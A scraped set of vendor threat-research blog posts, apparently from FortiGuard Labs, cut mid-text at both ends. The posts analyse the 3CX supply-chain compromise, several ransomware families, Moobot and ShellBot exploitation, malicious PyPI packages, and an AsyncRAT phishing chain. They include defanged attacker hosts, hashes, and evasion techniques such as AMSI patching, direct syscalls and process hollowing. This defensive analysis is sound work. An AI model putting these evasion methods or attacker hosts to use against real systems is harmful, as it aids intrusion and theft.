hand, it enables threat actors to abuse these frameworks to conduct attacks without developing or purchasing custom malware. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. This type of threats is usually delivered as email attachments. FortiMail can detect and quarantine the malicious attachments for such campaigns. Fortinet’s CDR (Content Disarm and Reconstruction) service can neutralize the embedded macros inside the Word document. The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. FortiGuard Labs providesBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date.

    "title": "3CX Desktop App Compromised (CVE-2023-29059)",
    "link": "https://www.fortinet.com/blog/threat-research/3cx-desktop-app-compromised",
    "content": "FortiGuard Labs Threat Research This is a developing story. Please check back for the latest updates from FortiGuard Labs. For a report of this event, please visit ourThreat Signal Reportspage. OnMarch 29, a number of reports surfaced thata legitimate signed file from VoIP/IP PBX solutions provider 3CX (3CXDesktop App) had been trojanized due to a code-level compromise. This is the latest high-profilesupply chain attack, beginning with SolarWinds and Kaseya a few years ago. This issue has been assignedCVE-2023-29059. 3CXDesktop App is a multi-platform softphone application for desktops (Linux, MacOS, and Windows). The 3CXDesktop App allows users to interact via chat, messaging, video, and voice. Initial reports suggested that all platforms of the 3CXDesktop App were compromised. But at the time of writing, it appears that only the Electron framework versions of MacOS (versions 18.11.1213, 18.12.402, 18.12.407, and 18.12.416) and Windows (versions 18.12.407 and 18.12.416) of the 3CX Desktop App areaffected.  3CX has stated that they are working on a new version of the Windows app and have revoked the certificate for the previous version. Initially, there was some confusion about whether the MacOS version was affected, as the CEO of 3CX issued a statement that only the Windows version of the app was affected. However, this statement was laterretracted. Currently, no status on the availability of the MacOS version has been provided at the time of writing. The company’s website boasts that 3CX is available in over 190 countries worldwide, with over 12 million daily users and a 600,000-plus customer base. Companies listed on its website include high-profile organizations in the automobile, aerospace, finance, food and beverage, government, hospitality, and manufacturing sectors, to name a few. The trojanized 3CX Desktop App is part of a multi-stage attack that utilizes a malicious sideloaded DLL (ffmpeg.dll - SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) that contains instructions and a payload within another DLL via an encrypted blob (d3dcompiler_47.dll – SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03). This blob also contains the shellcode, which tries to pull ICO files from GitHub (currently down) that contain various URIs for download, where the payload is ultimately loaded and installed to the target environment. However, we could not confirm further details as the repository is currently down. Looking at the Windows installer (SHA256:aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868), it drops TWO 3CXDesktopApp.exe files. The SECOND (inside app-18.12.407 folder) is the one that sideloads the ffmpeg.dll file.

This could be indicative of 3CX product's geographic customer base - including the possibility of various multinational corporations operating inside those regions. 3CXsuggeststhat users migrate to the PWA app in the meantime. The PWA app is web-based and is unaffected by the supply chain attack. Customers on 3CXHosted and StartUP are not affected. Additional details on updates and best practices can be foundhere. FortiGuard Labs suggests that all older variants of the 3CX Desktop App be discontinued immediately until newer unaffected versions are available. Fortinet Customers running the latest definitions are protected by the following AV signatures: W64/Agent.CFM!tr OSX/Agent.CN!tr Riskware/Sphone_XC3 All known network IOCs related to this attack are blocked by the WebFiltering client.

The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Dark Power and PayME100USD ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Overview Dark Power is a relatively new ransomware launched in early February 2023. This is a rare ransomware breed in that it was written in the Nim programming language. Dark Power Ransomware Infection Vector Information on the infection vector used by this group is not currently available. However, it is not likely to differ significantly from other ransomware groups. Dark Power Ransomware Execution Once the Dark Power ransomware is executed, it terminates the following processes to encrypt files that are presently in use: taskmgr.exe, encsvc.exe, powerpnt.exe, ocssd.exe, steam.exe, isqlplussvc.exe, outlook.exe, sql.exe, ocomm.exe, agntsvc.exe, mspub.exe, onenote.exe, winword.exe, thebat.exe, excel.exe, mydesktopqos.exe, ocautoupds.exe, thunderbird.exe, synctime.exe, infopath.exe, mydesktopservice.exe, firefox.exe, oracle.exe, sqbcoreservice.exe, dbeng50.exe, tbirdconfig.exe, msaccess.exe, visio.exe, dbsnmp.exe, wordpad.exe, xfssvccon.exe It also stops the following services: veeam, memtas, sql, mssql, backup, vss, Sophos, svc$, mepocs The ransomware then encrypts files and appends a “.dark_power” extension to the affected files. It avoids encrypting files and directories with the following extensions: .lib, .pack, .search-ms, .dat, .ini, .regtrans-ms, .vhdx, .ps1, .log2, .log1, .blf, .ldf, .lock, .theme, .msi, .sys, .wpx, .cpl, .adv, .msc, .scr, .bat, .key, .ico, .dll, .hta, .deskthemepack, .nomedia, .msu, .rtp, .msp, .idx, .ani, .386, .diagcfg, .bin, .mod, .ics, .com, .hlpF, .spl, .nls, .cab, .exe, .diagpkg, .icl, .ocx, .rom, .prf, .themepack, .msstyles, .lnk, .icns, .mpa, .drv, .cur, .diagcab, .cmd, .shs, readme.pdf (file name used for ransom note dropped by Dark Power ransomware), ef.exe (file name used for Dark Power ransomware), ntldr, thumbs.db, bootsect.bak, autorun.inf, ntuser.dat.log, boot.ini, iconcache.db, bootfont.bin, ntuser.dat, ntuser.ini, desktop.ini, program files, appdata, mozilla, $windows.~ws, application data, $windows.~bt, google, $recycle.bin, windows.old, programdata, system volume information, program files (x86), boot, tor browser, windows, intel, perflogs, msocache Once files have been encrypted, Dark Power drops a lengthy ransom note as a “readme.pdf”, as seen in Figure 1. The ransom note threatens victims that unless they send 10,000 USD worth of Monero (XMR) cryptocurrency to the attacker’s wallet within 72 hours, their encrypted files will be lost forever. During our research, we did not see the Dark Power ransomware delete volume shadow copies of the affected machine. As a result, such encrypted files are potentially recoverable. Note that the ransomware stops the Volume Shadow Copy (VSS) service before encrypting files. As such, files not written to a Volume Shadow Copy before the ransomware encrypted them are not recoverable from a backup created through the VSS. The ransom note also claims that the Dark Power threat actor stole data from the compromised machine, which will be published to its leak site on Tor if a ransom is not paid. At the time of this investigation, the leak site listed ten companies in various industries from nine countries in North America, Europe, and Africa. Stolen data does not appear to be kept on the leak site. The site claims that the attacker will share the file location once contacted via qTox. Overview PayMe100USD is a new ransomware written in Python that was discovered in March 2023. The malware has basic functionality and performs ordinary ransomware activities. PayMe100USD Ransomware Infection Vector The PayMe100USD ransomware samples that FortiGuard Labs collected have a Microsoft Bing logo and a file name of “newbing.exe”. As such, the ransomware was likely distributed via fake Bing installers. PayMe100USD Ransomware Execution Once the PayMe100USD ransomware is executed, it encrypts files in the D, E, and F drives and the user directory in the C drive. It adds a “.PayMe100USD” file extension to the affected files. The ransomware avoids encrypting files with the following file extensions: .py, .pem, .exe, .mp4, .mkv, .payme100usd (file extensions of the files encrypted by PayMe100USD ransomware) , .iso The ransomware then drops eight ransom notes, labeled “PayMe   1.txt” to “PayMe    8.txt”. Although the last number in the file names differ, all ransom notes are identical. The ransom notes ask victims to pay 100 USD worth of Bitcoin within 48 hours to recover the affected files and stop the alleged stolen data from being sold on the dark web. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Dark Power ransomware variants with the following AV signatures: FortiGuard Labs detects known PayMe100USD ransomware variants with the following AV signature: File-based IOCs: SHA256 Malware 33c5b4c9a6c24729bb10165e34ae1cd2315cfce5763e65167bd58a57fde9a389 Dark Power ransomware 11ddebd9b22a3a21be11908feda0ea1e1aa97bc67b2dfefe766fcea467367394 Dark Power ransomware c2aa5d89d1fb63c65806a789f529daf774ceff411338c43438ea6c0175e10fd0 PayMe100USD ransomware 4daca38854ba0a471d25250f106122ff81b8bbda2b19569a9e0b6e7f56187746 PayMe100USD ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "link": "https://www.fortinet.com/blog/threat-research/moobot-strikes-again-targeting-cacti-and-realtek-vulnerabilities",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows, LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical FortiGuard Labs observed several attacking bursts targeting Cacti and Realtek vulnerabilities in January and March of this year and then spreading ShellBot and Moobot malware. (Figure 1 shows trigger counts from our IPS signatures of the CVE-2021-35394 (Realtek) and CVE-2022-46169 (Cacti) vulnerabilities.) ShellBot is a malware developed in Perl that uses the Internet Relay Chat (IRC) protocol to communicate with the server, also known as PerlBot. Moobot is a Mirai variant botnet that targets exposed networking devices. We discovered that it had attackedHikvision products in 2021. Compromised endpoints can be controlled by its C&C server and deliver further attacks, such as distributed denial-of-service attacks. This article will examine the payloads of these two attacks and their resulting malware behavior. CVE-2021-35394 is an arbitrary command injection vulnerability that affects UDPServer due to insufficient legality detection on commands received fromclients. The complete payloads are shown in Figure 2. CVE-2022-46169 is a command injection vulnerability that allows an unauthenticated user to execute arbitrary code on a server running Cacti. The vulnerability resides in the “remote_agent.php” file, which can be accessed without authentication. The Moobot payload is shown in Figure 3, and the ShellBot payload is in Figure 4. The script file to further download Moobot is shown below. It executes the Moobot with the parameterrealtek.<Filename>. Analyzing the MIPS version (SHA256: 455314A186B4A9A1788E2ACB85A9B6B34FB0A7700D0DECC6DE056030FEA543DF), we can identify Moobot from the specific seed \"w5q6he3dbrsgmclkiu4to18npavj702f\" for generating random strings in Figure 6. Like most Mirai variants, it has an encrypted data section with a botnet configuration. The encryption key “0xDEADBEEF “ is shown in Figure 7. Once executed, it prints “listening to tun0” to the console and then starts communicating with the C2 host “troon[.]dns[.]army” with the heartbeat message “0x336699”. The traffic capture is shown in Figure 8. Once it receives the command from the C2 server, it starts its attack. Moobot includes the following process names of known bots and uses the command “kill -9” to ensure it’s the only one running in the infected device: dvrHelper, Ni**eR69xd, 1337SoraLOADER, Ni**eRd0nks1337, X19I239124UIU, IuYgujeIqn, 14Fa, ccAD, BOGOMIPS, /etc/rc.d/rc.local, g1abc4dmo35hnp2lie0kjf, /dev/FTWDT101_watchdog, /dev/netslink/, PRIVMSG, GETLOCALIP, KILLATTK, Eats8, v[0v, 93OfjHZ2z, GhostWuzHere666, WsGA4@F6F, ACDB, AbAd, iaGv ShellBot’s activity began in January and primarily targeted Cacti vulnerability. We collected three ShellBot variants in our traffic capture system. The first is “PowerBots (C) GohacK” from http[:]//80[.]68[.]196[.]6/ff, and the configuration is shown in Figure 9. Its C2 is “49[.]212[.]234[.]206:3303”, and the bot’s process masquerades as “/usr/sbin/sshd” to evade detection. After the communication channel setup, the client waits for a command from the server. There are six commands, shown below: The second variant is “LiGhT's Modded perlbot v2” from 85[.]239[.]33[.]32. It downloads the files “ce” and “plm”. Each has a slightly different configuration, as shown in Figure 10. The C2 host is “juice[.]baselinux[.]net”, and the process name is “/usr/sbin/mysql”. The traffic capture is shown in Figure 11. The server was created in March 2023, and hundreds of victims are already in this channel. The commands used in perlbot are listed below. It includes numerous types of flooding attacks and hacking functions. It also includes an exploit enhancement module that gets news from a public website offering exploits and security advisories. The third variant is “B0tchZ 0.2a” from 46[.]101[.]183[.]162/.xx/web. The malicious website is shown in Figure 12. All files on this website are IRC botnets that use the same C2 server, 198[.]98[.]61[.]106:8080. The configuration from the payload that targets vulnerable Cacti servers is shown in Figure 13. The file is written in Portuguese, and the command list is below: Over the past few months, threat actors have been spreading ShellBot and Moobot malware on exploitable servers. Compromised victims can be controlled and used as DDoS bots after receiving a command from a C2 server. Because Moobot can kill other botnet processes and also deploy brute force attacks, administrators should use strong passwords and change them periodically. Moreover, some of the ShellBot variants can install other malware from their C2 server. The vulnerabilities mentioned above have a critical security impact that can lead to remote code execution. Therefore, it is highly recommended that patches and updates be applied as soon as possible. This malware is detected and blocked by FortiGuard Antivirus as: Perl/IRCBot.I!tr ELF/Moobot.A!tr BASH/Agent.A!tr.dldr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. Fortinet has released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The FortiGuard Web Filtering Service blocks the C2 server.

    "title": "Supply Chain Attack via New Malicious Python Packages",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-packages",
    "content": "FortiGuard Labs Threat Research By monitoring an open-source ecosystem, the FortiGuard Labs team discovered over 60 zero-day attacks embedded in PyPI packages (Python Package Index) between early February and mid-March of 2023. In this blog, we cover all the packages that were found, grouping them into similar attacks or behaviors. 1.     The packages in this set were found to be similar: The setup.py file in these packages tries to run a PowerShell with a command encoded with Base64 that attempts to download a potentially malicious executable and execute it. The encoded command is decoded as follows: 2.     This next set of packages includes: The setup.py file in these packages tries to execute a python script written to connect to a URL that may contain malicious code. The contents of the URL resolve to the code we found in set three, below. 3.     The third set of packages includes: The setup.py file in these packages tries to steal sensitive information, such as credit cards, wallets, account logins, etc. using a Discord webhook. While the setup.py file for the component judyb-advanced may at first appear different from the others in this set (Figure 5), after being decoded with Base64 it resolves to the code shown in Figure 4. 4.     This set of packages includes: The setup.py file in these packages includes the Empyrean stealer code, an open-source code to launch an attack to steal users’ sensitive information. The code in these packages is heavily obfuscated, but we were able to see several techniques, including anti-debug, autorun, and injection methods written in Python. 5.     This set of packages includes: The setup.py file in these packages tries to download a zip file to a directory (depending on python version), extract its contents, run a script contained in the zip file, and then remove its directory. 6.     The packages in this set include: The setup.py file in these packages tries to download a zip file that contains malicious code, extracts it, and then tries to run it, all while trying to hide it from the user. 7.     This set includes the following package: Its setup.py file tries to exfiltrate user information to what looks like a webhook URL. 8.     This set includes the following package: Its setup.py file tries to execute heavily obfuscated code. Metadata information of the package gathered from its GitHub link, “https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks”, we get a clue that it may be a password stealer through a Discord webhook. 9.     This set includes the following package: Its setup.py file tries to run a potentially malicious python script and then remove it. In this blog, we have reviewed several sets of packages, each with different styles of attacks, that we have gathered over the past month or so. The packages in each set seem to use similar methods of attack. Given the volume and variety of malicious packages we have discovered, Python end users should use caution when downloading packages and double-check them before use. We will continue monitoring new open-source packages and reporting on any malicious packages we find to help prevent users from becoming victims of a supply chain attack.

    "content": "FortiGuard Labs Threat Research The mass distribution of wiper malware continues to showcase the destructive evolution of cyberattacks. Does the evidence corroborate the theory that the ongoing conflict in Europe is to blame for the rise in wipers? Indeed. Furthermore, given that Russia is the main source of wiper activity, one can anticipate an increase in the use of wipers against countries and organizations that provide aid, weapons, or other logistical support to Ukraine. While both ransomware and wipers increased in the second half of 2022,FortiGuard Labs researchfound it was wipers that really took off. And this trend shows no sign of slowing, which means defenders must take action and prepare now as if they will be targeted. Destructive APT-like wiper malware spread wide in 2022. Data analysis demonstrates a pattern of bad actors persistently deploying destructive attack methods against their targets. It also demonstrates, because the internet has no physical boundaries, how quickly cyber attackers are able to adopt and scale these kinds of attacks – which have been made possible in large part by the Cybercrime-as-a-Service (CaaS) paradigm. Wipers have been around since 2012 and got their name from the goal of the malware: to \"wipe\" the victim's computer files. Up until 2022, wiper activity was few and far between, with maybe one to two new samples cropping up per year. But between the first and second half of 2022, wiper volume saw a substantial increase in volume, and the year ended with a clearly higher uptick. An intriguing distinction in the first half of 2022 was that numerous organizations publicly linked most of the detected wipers—CaddyWiper, WhisperGate, HermeticWiper, etc.—to Russian state-sponsored actors. Furthermore, in the second half, additionally identified wipers were either attributed to pro-Russian hacktivist organizations like Somnia or to people who were motivated by this trend to develop their own wipers. That's a very important shift to note, as it opens the door to more families, actors, and cybercrime in general. The expansion of wiper malware into other nations later in the year caused a 53% rise in wiper activity from Q3 to Q4 alone. While part of this activity may have been made possible by wiper software, which was initially created and propagated by nation-state actors in the context of the war, it is now being adopted by cybercriminal organizations and is moving outside of Europe. Given the magnitude of activity seen at the end of last year, the trajectory of wiper malware does not look to be slowing down anytime soon. And that means that any company could be a potential target. Already this year, wiper malware has become more and more prevalent, which is troubling. A bigger worry is that wiperware will become increasingly commoditized and become even more easily accessible to cybercriminals via CaaS. One of the major new concerns the security community as a whole is experiencing is the use of wipers in conjunction with other attack vectors. Wipers have the potential to devastate IT networks in both the public and private sectors around the world. And because they have been commoditized, wipers can massively damage networks. The cybersecurity community is always looking for the next shiny object that might aid in the fight against ransomware and wipers. Investment up front for mitigation of wipers is increasingly important, as initial damage can be exponentially costly for recovery. And it’s really tried-and-true tactics like these that win the day: Cybercriminals never pass up an opportunity. Threats are always increasing, whether it's a vulnerability, an attack, or a global conflict. Constantly keeping an eye on emerging trends like wiper malware use will help you anticipate what's coming and prioritize your resources for critical strategies you can implement to improve your cybersecurity posture, ensuring there are no gaps in your defense. This will improve your business’s ability to function even in the case of an unanticipated attack.

    "title": "Ransomware Roundup — HardBit 2.0",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-ransomware-roundup",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the HardBit 2.0 ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Overview HardBit ransomware dates to at least October 2022, with the current 2.0 version having been released shortly thereafter, in November 2022. As is commonplace now, HardBit leverages the “double extortion” technique of encrypting the files of a victim for ransom and then backstopping that action with a threat to release sensitive information and data if the ransom is not paid. HardBit 2.0 Ransomware Infection Vector Information on the infection vector used by this group is not currently available. However, it is not likely to differ greatly from other ransomware groups. HardBit 2.0 Ransomware Execution Upon execution, HardBit 2.0 terminates processes and services to slow the potential detection of its activities. It then encrypts files of interest and renames them to something random followed by [id-XXXX].[contact email].hardbit2. In each directory where files have been encrypted, an HTA file named “Help_me_for_Decrypt.hta” and a ransom note named “How To Restore Your Files.txt” are deposited. The ransom note contains an explanation of what has happened, a guarantee of recovery if payment is made, and e-mail addresses for contacting the attacker. Quite interestingly, there is no price specified in the ransom, ensuring a victim will have to contact the attacker to negotiate. Additionally, there is an entire paragraph on cyber insurance and the suggestion to undercut the provider by providing details of the insurance policy “anonymously”. This is (by their logic) a way to ensure their payment demands don’t exceed the maximum policy threshold so both the attacker and the policyholder get their payout. The HTA file is launched automatically once HardBit finishes encrypting the files on the host. It also provides a Tox ID with which to contact the attacker. Tox is an open-source, peer-to-peer instant messaging platform (https://en.wikipedia.org/wiki/Tox_(protocol)). It also has additional warnings indicating that if contact is not made within 48 hours, the ransom will double. On the Desktop, a JPEG image, “HARDBIT.jpg”, is dropped. This becomes the background for the compromised machine. The image reiterates that the victim should refer to the “Help_me_for_Decrypt.hta” and “How To Restore Your Files.txt” files deposited in their system. It also explains that files were also exfiltrated and explicitly threatens to release them for sale or onward publishing if contact is not forthcoming. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known HardBit ransomware variants with the following AV signatures: The FortiGate, FortiMail, FortiClient, and FortiEDR solutions all support the FortiGuard AntiVirus service. As a result, customers with up-to-date protections are protected. File-based IOCs: SHA256 Malware 422e0e4e01c826c8a9f31cb3a3b37ba29fb4b4b8c4841e16194258435056d8a3 HardBit 2.0 a0138b24593483f50ae7656985b6d6cfe77f7676ba374026199ad49ad26f2992 HardBit 2.0 cb239d641cfa610b1eaf0ecd0f48c42dd147f547b888e4505297c4e9521d8afe HardBit 2.0 fafbe16c5646bf1776dd3ef62ba905b9b2cb0ee51043859a2f3cdda7dfe20d4c HardBit 2.0 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "title": "Microsoft OneNote File Being Leveraged by Phishing Campaigns to Spread Malware",
    "link": "https://www.fortinet.com/blog/threat-research/microsoft-onenote-file-being-leveraged-by-phishing-campaigns-to-spread-malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully control the victim’s computerSeverity level:Critical A couple of phishing campaigns that recently caught FortiGuard Labs’ attention were found sending phishing emails with attached malicious Microsoft OneNote files to spread the AsyncRAT malware. As a cybersecurity researcher, I conducted an in-depth analysis of these phishing campaigns, tracing the entire process from the initial phishing email to the final deployment of AsyncRAT, which gains complete control of the victim's device. In this analysis, you will learn about the contents of this attack, such as what kind of phishing email starts the campaign, how a malicious Microsoft OneNote file is involved in the campaign, how it is leveraged to download and executemalicious fileson the victim’s device, the kinds of techniques that enable it to evade detection and analysis, and how the malware – AsyncRAT – communicates with its C2 server, including what control commands it supports to fully control the victim’s device. The following flowchart roughly describes the entire process of how the phishing campaign delivers and executes AsyncRAT: Figure 1.1 shows the captured phishing email in Outlook. As you can see, the email’s Subject has been marked as SPAM by our FortiMail service to alert the recipient to potential risks. The phishing email is disguised as an urgent shipment notification from a well-known delivery company. It asks the recipient to confirm whether a shipping address is correct by opening the attached Microsoft OneNote file, “SHIPPING_DOC.one”. Microsoft OneNote is a digital note-taking software provided as part of the Microsoft Office suite. It allows users to create notes that include texts, pictures, tables, and drawings. It also has a feature that allows users to insert file attachments into OneNote, including executable files (click menu “Insert” -> “File Attachment”). The left side of Figure 2.1 shows the OneNote file attached to the phishing email after being opened in the Microsoft OneNote program. It contains a button that lures the intended victim into clicking it to view the content. This button-like image conceals four identical BAT files that can be seen on the right side of Figure 2.1 when the button picture is moved out of the way. When double-clicking the button-like image, one of the inserted BAT files (viewn.bat) is executed. A batch file (.BAT) is a script containing a group of commands executed together by a command-line interpreter (like cmd.exe). The code in the viewn.bat file is similar to the following: Once the victim double-clicks the picture in the Microsoft OneNote program, a piece of Windows PowerShell script is also executed that downloads another BAT file called “Io.bat”. It is launched using the command “start Io.bat”. Figure 2.2 below shows the content of Io.bat in an editor. Io.bat’s primary task is similar to the previously described “viewn.bat”. It runs a Windows PowerShell script that downloads a ZIP archive file called “view.zip” onto the victim’s device. The script then decompresses an EXE file (view.exe) from the ZIP archive and executes it using the “start view.exe” command. Malware often employs complex methods to evade detection and analysis by security researchers. In this case, the downloaded view.exe is not the malware payload but a dropper of another batch file (“fresh.bat”). Figure 2.2 shows several screenshots of view.exe in a debugger. View.exe calls Windows-native APIs to load a resource called “CABINET” from the “RCData” folder in its RESOURCE section. It includes compressed data in a CAB file type. View.exe decompresses the resource data and saves it into the file “%temp%\\IXP004.TMP\\fresh.bat”. It then calls the API CreateProcessA() to run fresh.bat with the command “cmd /c fresh.bat”. Fresh.bat is obfuscated, as shown in Figure 2.4. Its commands are split into a branch of variables that are combined at the bottom before executing. The purpose of the combined commands is to copy Windows PowerShell.exe into the current folder and rename it as “fresh.bat.exe”. It then uses this to execute the piece of PowerShell code shown below. The PowerShell code is lightly obfuscated, like the reversed function names. However, it is easy to understand its code with the added comments. This segment of PowerShell code reads a chunk of strings that start with “:: “ from fresh.bat, a transformed PE file, as shown in Figure 2.4. (By the way, lines starting with “::” are comments in batch files (.BAT).) It then dynamically decodes, decrypts, and decompresses a PE file into memory and executes it by invoking its EntryPoint() function. Although it is fileless, it is originally named tmp72AF.tmp according to its compile information. Figure 2.5 shows a screenshot of the process tree, which explains the workflow from opening the OneNote file to running fresh.bat and fresh.bat.exe to executing the PowerShell code. It also shows the relationship between relevant processes. The fileless .Net PE file (origin name “tmp72AF.tmp”) is a malware loader program. It decrypts two executable modules from its .Net Resource section and launches them. 1.     Anti-analysis In the Main() function, the malware calls the APIs CheckRemoteDebuggerPresent() and IsDebuggerPresent() to check if it is running in a debugger. It then checks the value of that assessment in Debugger.IsAttached. If either of them is “true”, the program exits immediately. Windows provides a system module called “amsi.dll“ (Antimalware Scan Interface) that has an export function called AmsiScanBuffer(). This can scan a data buffer for malware or malicious content. Tmp72AF.tmp can override the API function to have it always return a code of 0x80070057, which means \"the parameter is incorrect\". This override technique prevents the API AmsiScanBuffer() from detecting malware. To do this, it needs to call the API VirtualProtect() to set the memory of AmsiScanBuffer() to writable. Figure 3.1 illustrates a comparison between the original API AmsiScanBuffer() and the override API. 2.     Decrypt two executable modules from the .Net Resource section As mentioned earlier, there are two modules in the .Net Resource section to be decrypted. Figure 3.2 displays the .Net Resource section with those two resources, “payload.exe” and “runpe.dll”. These two resources are encrypted and compressed using GZip compression. They are decrypted into the memory of the running processes (fresh.bat.exe, the copied PowerShell.exe). As their names suggest, the .Net program uses “runpe.dll” to launch “payload.exe”. The below figure shows when tmp72AF.tmp invokes the runpe.RunPE.ExecutePE() method of runpe.dll, where string3 is “runpe.RunPE”, string4 is “ExecutePE”, and array3 holds the data of the decrypted payload.exe. ExecutePE() launches payload.exe in a newly-created thread by invoking its entry point function. Payload.exe is a 64-bit console program that performs process hollowing to implant the AsyncRAT client into the target process notepad.exe. The trick of payload.exe is leveraging the “syscall” instruction every time it needs to call the undocumented APIs. In addition, all constant strings are encrypted and only decrypted before being referenced. This allows it to evade anti-virus software detection, creating challenges for security analysts. Below is a list of syscall ids and the corresponding APIs used by payload.exe. The following code snippet of “syscall” is used for calling the API NtOpenProcess(), where eax should be 0x26. To maintain persistence of the target process on the victim's device, payload.exe disguises the target process to appear as if it was started by the victim—which means its parent process is explorer.exe. To do this, it retrieves the process information of explorer.exe from the current process list by calling API NtQuerySystemInformation() using SystemProcessInformation as the value of the parameter SYSTEM_INFORMATION_CLASS. It then calls the API NtOpenProcess() to retrieve the process handle of explorer.exe. It uses this handle to set the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute to explorer.exe using the API UpdateProcThreadAttribute(). This allows child processes to inherit this attribute. Meanwhile, that API function fills an attribute list with the inherited information from explorer.exe. As you can see in Figure 4.1, the malware was about to call the API CreateProcessW() with a full path of notepad.exe with the created flag of CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED and lpStartupInfo with the inherited explorer.exe information. After its creation, the notepad.exe process becomes a sub-process of explorer.exe as if it’s launched by the victim. Using 